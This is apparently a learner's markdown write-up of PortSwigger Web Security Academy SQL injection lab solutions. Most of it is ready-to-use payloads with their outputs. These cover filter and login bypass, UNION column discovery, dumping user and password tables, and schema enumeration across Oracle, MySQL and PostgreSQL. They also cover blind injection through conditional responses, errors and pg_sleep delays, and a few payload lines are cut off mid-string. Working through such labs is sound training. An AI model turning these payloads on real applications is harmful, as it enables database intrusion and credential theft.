# SQL Injections

Solutions for SQL Injections 

## Retrieving hidden data

```python
https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Lifestyle'+OR+1=1--
```

## Subverting application logic

```python
batman'--
```

## Retrieving data from other database tables

### Finding number of columns for union injection

this errors out

```python
https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+null--

Result 
Error status code - 500 Internal Server Error

https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+null,null--

Result 
Error status code - 500 Internal Server Error

https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+null,null,null--

Result 
Web page appers like normal so there are 3 columns in this sql query 

```

so we keep increasing null's till we don't get an error we are using null instead of values because null is valid characters in every major database which will not error out when data type of the data is incorrect

### Finding columns with string data type in all three columns

we will fuzz and find a column to get a valid column that can give us a place to retrieve data from the app 

```python
https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+'lol',null,null--

Result 
Error status code - 500 Internal Server Error

https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+null,'lol',null--

https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Lifestyle'+UNION+SELECT+null,'lol','lol'--

Result  
Web page appers like normal so 2 & 3 columns in this sql query can print strings

```

## Using an SQL injection UNION attack to retrieve passwords and users from database

We can take data of username and password from database with this Query 

```python
https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Pets'+UNION+SELECT+username,password+FROM+users--

result
administrator azyikm320mdsf903

```

### Getting many columns from database by using just one union column with concatination

when only one column have string data type we can not use above technique there are than two ways we can either take out data one at a time or we can use concatenation below example we used oracle DB's concatenation method you can look for more syntax for other db's at this link

[SQL injection cheat sheet | Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)

```python
https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+null,username+||+'~'+||+password+FROM+users--

Result
wiener~griffin
administrator~azyikm320mdsf903
carlos~meowlol
```

# Examining the database

## Getting DB's version in different database's

### SQL injection attack, querying the database type and version on Oracle

```python
https://acbe1f881f0ca4fb801e011d00380072.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+BANNER,null+FROM+v$version--
```

### SQL injection attack, querying the database type and version on MySQL and Microsoft

```python
?category=Lifestyle'+UNION+SELECT+null,@@version--+
```

### SQL injection attack, listing the database contents on non-Oracle databases

```python
?category=Gifts%27+UNION+SELECT+version(),null--+
PostgreSQL 11.2 (Debian 11.2-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit

?category=Gifts%27+UNION+SELECT+TABLE_SCHEMA,TABLE_NAME+FROM+information_schema.tables--+
public / users_xsxvki

?category=Gifts%27+UNION+SELECT+null,COLUMN_NAME+FROM+information_schema.columns+WHERE+table_name=%27users_xsxvki%27--+
username_difdky
password_gjwzbs

?category=Gifts%27+UNION+SELECT+username_difdky,password_gjwzbs+FROM+users_xsxvki--+
administrator / niuv95
```

### **SQL injection attack, listing the database contents on Oracle**

```
https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2105.htm#REFRN20286
?category=Gifts%27+UNION+SELECT+null,TABLE_NAME+FROM+all_tables--
USERS_TUEJNQ

https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2094.htm
?category=Gifts%27+UNION+SELECT+null,COLUMN_NAME+FROM+all_tab_columns+WHERE+TABLE_NAME=%27USERS_TUEJNQ%27--
USERNAME_GIBQLT
PASSWORD_EZJBQY

?category=Gifts%27+UNION+SELECT+USERNAME_GIBQLT,PASSWORD_EZJBQY+FROM+USERS_TUEJNQ--+
administrator / lpm52k

```

# **Blind SQL injection vulnerabilities**

## **Blind SQL injection with conditional responses**

Determine password length:

```
TrackingId=a'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(passwor
```

use the script in this repo i created to retrieve the password of administrator user or you can use burp intruder with a cluster bomb see how to do it here

[vernjan/web-security-academy](https://github.com/vernjan/web-security-academy/blob/master/SQLi.md)

```python
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a'--;
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='b'--;

TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,2,1)='a'--;
TrackingId=x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,2,1)='c'--;
```

## **Blind SQL injection with conditional errors**

Determine password length:

```
TrackingId=x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+length(password)>6)+T
```

use the script in this repo i created to retrieve the password of administrator user or you can use burp intruder with a cluster bomb 

```python
TrackingId=x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,1,1)='a')+THEN+to_char(1/0)+ELSE+null+END+FROM+users--;

TrackingId=x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,1,1)='b')+THEN+to_char(1/0)+ELSE+null+END+FROM+users--;

TrackingId=x'+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,1,1)='c')+THEN+to_char(1/0)+ELSE+null+END+FROM+users--;
```

### **Blind SQL injection with time delays**

```
TrackingId=x'||pg_sleep(10)--
```

### **Blind SQL injection with time delays and information retrieval**

Determine password length:

```
TrackingId=a'%3bselect+case+when+(username='administrator'+and+length(password)=6)+then+pg_sle
```

use the script in this repo i created to retrieve the password of administrator user or you can use burp intruder with a cluster bomb 

```python
TrackingId=a'%3bselect+case+when+(username='administrator'+and+substring(password,1,1)='a')+then+pg_sleep(10)+else+null+end+from+users--;

TrackingId=a'%3bselect+case+when+(username='administrator'+and+substring(password,1,1)='b')+then+pg_sleep(10)+else+null+end+from+users--;

TrackingId=a'%3bselect+case+when+(username='administrator'+and+substring(password,1,1)='c')+then+pg_sleep(10)+else+null+end+from+users--;

TrackingId=a'%3bselect+case+when+(username='administrator'+and+substring(password,1,1)='d')+then+pg_sleep(10)+else+null+end+from+users--;
```

### Note:- some of the examples here are taken from this repo because when i was going through the lab i forgot to document the results and queries

[vernjan/web-security-academy](https://github.com/vernjan/web-security-academy/blob/master/SQLi.md)